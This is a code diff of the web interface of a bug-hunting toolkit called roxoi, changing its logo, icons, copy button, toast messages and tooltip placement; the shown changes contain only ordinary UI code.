-            font-size: 13px;
-            color: #fff;
-            text-transform: uppercase;
-          "
-          >roxoi</span
-        >
-        <span style="color: var(--border); font-size: 11px">|</span>
-        <span style="color: var(--dim); font-size: 11px">BugHunt Toolkit</span>
+        <div class="logo">
+          <img
+            src="roxoi16x16.ico"
+            height="32"
+            width="32"
+            alt="logo"
+            style="
+              object-fit: cover;
+              border: 1px solid green;
+              border-radius: 4px;
+              padding: 1px;
+            "
+          />
+          <div style="text-transform: uppercase">roxoi</div>
+        </div>
       </div>
       <div style="color: var(--muted); font-size: 11px; letter-spacing: 0.3px">
-        © <span id="footerYear"></span>
+        &copy; <span id="footerYear"></span>
         <span
           style="
             color: var(--accent);
@@ -7217,11 +9599,55 @@ echo "=== Recon Summary ==="
         <span style="margin: 0 6px; color: var(--border)">·</span>
         For authorized security testing only
         <span style="margin: 0 6px; color: var(--border)">·</span>
+        <!-- Projects Link -->
         <a
           href="projects.html"
-          style="color: var(--accent2); text-decoration: none; font-weight: 600"
-          >⊞ Projects</a
+          tooltip="Manage saved projects"
+          class="reset-btn animated-btn"
+          style="
+            text-decoration: none;
+            color: var(--accent2);
+            border: none;
+            background-color: transparent;
+          "
         >
+          <svg
+            width="16"
+            height="16"
+            viewBox="0 0 24 24"
+            fill="none"
+            xmlns="http://w3.org"
+          >
+            <!-- Top layer -->
+            <path
+              class="anim-layer-top"
+              d="M12 2L2 7l10 5 10-5-10-5z"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            />
+            <!-- Middle architectural tier -->
+            <path
+              class="anim-layer-mid"
+              d="M2 12l10 5 10-5"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            />
+            <!-- Bottom architectural tier -->
+            <path
+              class="anim-layer-bot"
+              d="M2 17l10 5 10-5"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            />
+          </svg>
+          Projects
+        </a>
       </div>
     </footer>
 
@@ -7361,23 +9787,27 @@ echo "=== Recon Summary ==="
             + New Project
           </div>
           <button
+            class="close-btn"
             id="modalCloseBtn"
-            style="
-              background: none;
-              border: 1px solid var(--border);
-              border-radius: 4px;
-              color: var(--dim);
-              font-size: 14px;
-              width: 28px;
-              height: 28px;
-              cursor: pointer;
-              display: flex;
-              align-items: center;
-              justify-content: center;
-              transition: all 0.15s;
-            "
+            tooltip="Close"
+            type="button"
           >
-            ✕
+            <svg
+              width="16"
+              height="16"
+              viewBox="0 0 24 24"
+              fill="none"
+              xmlns="http://w3.org"
+            >
+              <path
+                class="anim-close-cross"
+                d="M18 6L6 18M6 6l12 12"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
           </button>
         </div>
         <div style="display: flex; flex-direction: column; gap: 12px">
@@ -7461,200 +9891,6 @@ echo "=== Recon Summary ==="
                 "
                 >Platform</label
               >
-              <style>
-                .mpd-wrap {
-                  position: relative;
-                  width: 100%;
-                  font-family: var(--mono);
-                }
-                .mpd-trigger {
-                  width: 100%;
-                  background: #080b0e;
-                  border: 1px solid var(--border);
-                  border-radius: 5px;
-                  color: var(--text);
-                  font-family: var(--mono);
-                  font-size: 12px;
-                  padding: 8px 12px;
-                  display: flex;
-                  align-items: center;
-                  justify-content: space-between;
-                  gap: 8px;
-                  cursor: pointer;
-                  outline: none;
-                  transition: border-color 0.15s;
-                  box-sizing: border-box;
-                }
-                .mpd-trigger:hover,
-                .mpd-trigger.open {
-                  border-color: var(--accent2);
-                }
-                .mpd-trigger-content {
-                  display: flex;
-                  align-items: center;
-                  gap: 8px;
-                  min-width: 0;
-                }
-                .mpd-trigger-content .mpd-label {
-                  overflow: hidden;
-                  text-overflow: ellipsis;
-                  white-space: nowrap;
-                }
-                .mpd-trigger-content .mpd-placeholder {
-                  color: var(--dim);
-                }
-                .mpd-chevron {
-                  color: var(--dim);
-                  font-size: 9px;
-                  flex-shrink: 0;
-                  transition: transform 0.15s;
-                }
-                .mpd-trigger.open .mpd-chevron {
-                  transform: rotate(180deg);
-                }
-
-                .mpd-menu {
-                  position: absolute;
-                  top: calc(100% + 4px);
-                  left: 0;
-                  right: 0;
-                  background: #080b0e;
-                  border: 1px solid var(--border);
-                  border-radius: 5px;
-                  max-height: 260px;
-                  overflow-y: auto;
-                  z-index: 410;
-                  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
-                  display: none;
-
-                  /* Firefox thin scrollbar */
-                  scrollbar-width: thin;
-                  scrollbar-color: var(--border) #080b0e;
-                }
-                .mpd-menu.open {
-                  display: block;
-                }
-
-                /* Webkit thin scrollbar */
-                .mpd-menu::-webkit-scrollbar {
-                  width: 5px;
-                }
-                .mpd-menu::-webkit-scrollbar-track {
-                  background: #080b0e;
-                }
-                .mpd-menu::-webkit-scrollbar-thumb {
-                  background: var(--border);
-                  border-radius: 3px;
-                }
-                .mpd-menu::-webkit-scrollbar-thumb:hover {
-                  background: var(--accent2);
-                }
-
-                .mpd-search-wrap {
-                  position: sticky;
-                  top: 0;
-                  background: #080b0e;
-                  padding: 6px;
-                  border-bottom: 1px solid var(--border);
-                  z-index: 1;
-                }
-                .mpd-search {
-                  width: 100%;
-                  background: #0d1117;
-                  border: 1px solid var(--border);
-                  border-radius: 4px;
-                  color: var(--text);
-                  font-family: var(--mono);
-                  font-size: 11px;
-                  padding: 6px 8px;
-                  outline: none;
-                  box-sizing: border-box;
-                  transition: border-color 0.15s;
-                }
-                .mpd-search:focus {
-                  border-color: var(--accent2);
-                }
-                .mpd-search::placeholder {
-                  color: var(--dim);
-                }
-
-                .mpd-group-label {
-                  font-size: 9px;
-                  font-weight: 700;
-                  letter-spacing: 1px;
-                  text-transform: uppercase;
-                  color: var(--muted);
-                  padding: 8px 12px 4px;
-                }
-                .mpd-option {
-                  display: flex;
-                  align-items: center;
-                  gap: 8px;
-                  padding: 7px 12px;
-                  cursor: pointer;
-                  font-size: 12px;
-                  font-family: var(--mono);
-                  color: var(--text);
-                  transition: background 0.1s;
-                }
-                .mpd-option:hover,
-                .mpd-option.active {
-                  background: rgba(0, 184, 255, 0.08);
-                }
-                .mpd-option.placeholder {
-                  color: var(--dim);
-                }
-                .mpd-no-results {
-                  padding: 14px 12px;
-                  font-size: 11px;
-                  color: var(--dim);
-                  text-align: center;
-                  display: none;
-                }
-                .mpd-icon {
-                  width: 14px;
-                  height: 14px;
-                  border-radius: 3px;
-                  flex-shrink: 0;
-                  display: inline-block;
-                  object-fit: contain;
-                }
-                .mpd-icon-emoji {
-                  width: 14px;
-                  height: 14px;
-                  flex-shrink: 0;
-                  display: inline-flex;
-                  align-items: center;
-                  justify-content: center;
-                  font-size: 11px;
-                }
-                .mpd-icon-none {
-                  width: 14px;
-                  height: 14px;
-                  flex-shrink: 0;
-                }
-                .mpd-other-input {
-                  width: 100%;
-                  background: #080b0e;
-                  border: 1px solid var(--border);
-                  border-radius: 5px;
-                  color: var(--text);
-                  font-family: var(--mono);
-                  font-size: 12px;
-                  padding: 8px 12px;
-                  outline: none;
-                  margin-top: 8px;
-                  box-sizing: border-box;
-                  display: none;
-                  transition: border-color 0.15s;
-                }
-                .mpd-other-input:focus {
-                  border-color: var(--accent2);
-                }
-                .mpd-other-input.show {
-                  display: block;
-                }
-              </style>
 
               <div class="mpd-wrap" id="modalPlatformDropdown">
                 <button
@@ -8344,21 +10580,35 @@ echo "=== Recon Summary ==="
         }
 
         // Copy buttons
+        let COPY_ICON_HTML =
+          '<rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2" />' +
+          '<path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />';
+
+        let CHECK_ICON_HTML = '<path class="check-pop" d="M20 6L9 17l-5-5" />';
+
         document.querySelectorAll('.cpb').forEach(function (btn) {
+          let icon = btn.querySelector('.btn-icon');
+          let resetTimer = null;
+
           btn.addEventListener('click', function () {
             let pre = this.closest('.cb').querySelector('pre');
             let text = pre.textContent.replace(/TARGET/g, target);
+
+            function onCopySuccess() {
+              btn.classList.add('copied');
+              if (icon) icon.innerHTML = CHECK_ICON_HTML;
+              showToast('Copied to clipboard');
+
+              clearTimeout(resetTimer);
+              resetTimer = setTimeout(function () {
+                btn.classList.remove('copied');
+                if (icon) icon.innerHTML = COPY_ICON_HTML;
+              }, 2000);
+            }
+
             navigator.clipboard
               .writeText(text)
-              .then(function () {
-                btn.textContent = '✓ Copied';
-                btn.classList.add('copied');
-                showToast('Copied to clipboard');
-                setTimeout(function () {
-                  btn.textContent = '⎘ Copy';
-                  btn.classList.remove('copied');
-                }, 2000);
-              })
+              .then(onCopySuccess)
               .catch(function () {
                 let ta = document.createElement('textarea');
                 ta.value = text;
@@ -8366,25 +10616,33 @@ echo "=== Recon Summary ==="
                 ta.select();
                 document.execCommand('copy');
                 document.body.removeChild(ta);
-                btn.textContent = '✓ Copied';
-                btn.classList.add('copied');
-                showToast('Copied to clipboard');
-                setTimeout(function () {
-                  btn.textContent = '⎘ Copy';
-                  btn.classList.remove('copied');
-                }, 2000);
+                onCopySuccess();
               });
           });
         });
 
-        // Toast
-        function showToast(msg) {
+        /* Toast  */
+        function showToast(msg, warn) {
           let t = document.getElementById('toast');
-          t.textContent = '✓ ' + msg;
-          t.classList.add('show');
-          setTimeout(function () {
+
+          // Define inline SVGs with crisp paths and CSS animation hooks
+          const successSvg = `
+    <svg class="toast-icon animate-check" viewBox="0 0 24 24">
+      <path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="M20 6L9 17l-5-5"/>
+    </svg>`;
+
+          const warnSvg = `
+    <svg class="toast-icon animate-warn" viewBox="0 0 24 24">
+      <path fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" d="M12 9v4M12 17h.01"/>
+      <path fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" d="M12 3L2 21h20L12 3z"/>
+    </svg>`;
+
+          t.innerHTML = (warn ? warnSvg : successSvg) + `<span>${msg}</span>`;
+          t.className = 'toast show' + (warn ? ' warn' : '');
+          clearTimeout(t._tid);
+          t._tid = setTimeout(function () {
             t.classList.remove('show');
-          }, 2500);
+          }, 2600);
         }
 
         // Target input
@@ -9078,6 +11336,37 @@ echo "=== Recon Summary ==="
           .addEventListener('keydown', function (e) {
             if (e.key === 'Enter') createProject();
           });
+
+        document.addEventListener(
+          'mouseover',
+          (event) => {
+            const target = event.target.closest('[tooltip]');
+            if (!target) return;
+            if (event.relatedTarget && target.contains(event.relatedTarget))
+              return;
+
+            target.classList.remove(
+              'tooltip-bottom',
+              'tooltip-shift-left',
+              'tooltip-shift-right',
+            );
+            const rect = target.getBoundingClientRect();
+            const viewWidth = window.innerWidth;
+            const tooltipText = target.getAttribute('tooltip');
+            const estimatedWidth = Math.max(tooltipText.length * 7.5 + 24, 120);
+            const halfTooltip = estimatedWidth / 2;
+            if (rect.top < 50) {
+              target.classList.add('tooltip-bottom');
+            }
+            const elementCenter = rect.left + rect.width / 2;
+            if (elementCenter - halfTooltip < 12) {
+              target.classList.add('tooltip-shift-left');
+            } else if (elementCenter + halfTooltip > viewWidth - 12) {
+              target.classList.add('tooltip-shift-right');
+            }
+          },
+          true,
+        );
 
         // Splash screen: show if no projects exist
         (function checkFirstRun() {
